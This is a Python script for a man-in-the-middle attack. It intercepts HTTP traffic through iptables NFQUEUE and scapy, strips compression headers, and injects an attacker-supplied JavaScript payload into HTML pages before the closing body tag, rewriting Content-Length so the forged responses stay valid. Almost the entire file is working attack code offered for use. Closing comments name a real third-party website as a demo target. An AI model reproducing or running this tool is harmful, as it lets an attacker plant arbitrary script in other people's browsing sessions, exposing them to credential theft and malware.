#!/usr/bin/env python

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Version: 0.1.0

Presumes controller is MITM.
Allocates HTTP Txs into a queue. Isolates HTTP raw load layer,
matches encoding against a regex and supplants with an empty str
to elicit plaintext HTML response, which enables JS injection.
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse
import re

ENCODING_REGEX = "Accept-Encoding:.*?\\r\\n"
LEN_REGEX = "(?:Content-Length:\s)(\d*)"
INJECTION_REGEX = "</body>"

def elicit_arguments():
    """
    Fetches arguments ...
    """                                                                                                                                                                                                                                                                                                                         
    parser = argparse.ArgumentParser(description="Automates code injection in HTTP responses.")
    parser.add_argument("-p","--payload", dest="payload", help="full Javascript payload")
    args = parser.parse_args() 
    if (not args.payload):
        parser.error("[-] No payload was provided. Use --help for usage instructions." )
    return args


def generate_load(packet, load):
    """
    Surrogates target file with controller-provided file.
    Configures necessary fields to generate valid packet response,
    returns said modified response.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet): 
    """
    Determines how to process each packet in queue.
    ...
    """
    # wrap payload packet in Scapy IP layer
    global payload
    scapy_packet_obj = scapy.IP(packet.get_payload())
    if (scapy_packet_obj.haslayer(scapy.Raw)):
        load = scapy_packet_obj[scapy.Raw].load
        # request obj
        if (scapy_packet_obj[scapy.TCP].dport == 80):
            print("[+] Request")
            # remove Encoding header to force resolution of HTML to UTF-8
            load = re.sub(ENCODING_REGEX, "", load)
            load = load.replace("HTTP/1.1" , "HTTP/1.0")
        # response obj
        elif (scapy_packet_obj[scapy.TCP].sport == 80): 
            print("[+] Response")
            content_len_grp = re.search(LEN_REGEX, load)
            load = load.replace(INJECTION_REGEX, payload + INJECTION_REGEX)
        
            if (content_len_grp and "text/html" in load):
                content_len = content_len_grp.group(1)
                new_content_len = int(content_len) + len(payload)
                load = load.replace(content_len, str(new_content_len))

        if (load != scapy_packet_obj[scapy.Raw].load):
            generated_packet = generate_load(scapy_packet_obj, load)
            packet.set_payload(str(generated_packet))

    packet.accept()

def bind_queue():
    """
    Initiates a netfilterqueue object and binds to callback method
    so as to access the queue and act upon all packets therein.
    """
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    print("[+] Instantiating queue...")
    cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
    test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
    proc = subprocess.Popen(test_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),
    bind_queue()


user_args = elicit_arguments() 
payload = user_args.payload

def main():
    instantiate_queue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[x] Program terminated by user. Flushing IP Tables...")
        subprocess.call(["iptables --flush"], shell=True)
        
# demo 
# http://iberianodonataucm.myspecies.info/sites/iberianodonataucm.myspecies.info/files/evolucion%20odonatos.PNG
# jpg
# visit: http://iberianodonataucm.myspecies.info/